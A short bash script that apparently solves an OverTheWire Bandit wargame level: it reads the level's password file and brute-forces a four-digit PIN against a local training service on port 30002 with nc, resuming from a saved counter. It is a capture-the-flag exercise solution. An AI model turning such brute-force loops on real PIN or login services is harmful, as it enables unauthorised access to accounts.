#!/bin/bash
 
MAX_PIN=9999
RESULTS_FILE="/tmp/codebluedev/bandit25/results.txt"
BANDIT24_PASSWORD=$(cat /etc/bandit_pass/bandit24)
LAST_PIN_TRIED_FILE="/tmp/codebluedev/bandit25/last_pin_tried.txt"
LAST_PIN_TRIED=$(cat $LAST_PIN_TRIED_FILE)
SERVICE_HOST="localhost"
SERVICE_PORT=30002
 
for i in  `seq $LAST_PIN_TRIED $MAX_PIN`;
do
        echo $i > $LAST_PIN_TRIED_FILE
        echo "Pin $i..."
        printf "$BANDIT24_PASSWORD %04d\n " $i | nc $SERVICE_HOST $SERVICE_PORT >> $RESULTS_FILE
        RESULTS=`sort $RESULTS_FILE | uniq -u`
        if [ ${#RESULTS} -gt 2 ] && [$i != "1"];
        then
                echo "Pin is $i"
                echo $RESULTS
                exit
        fi
done
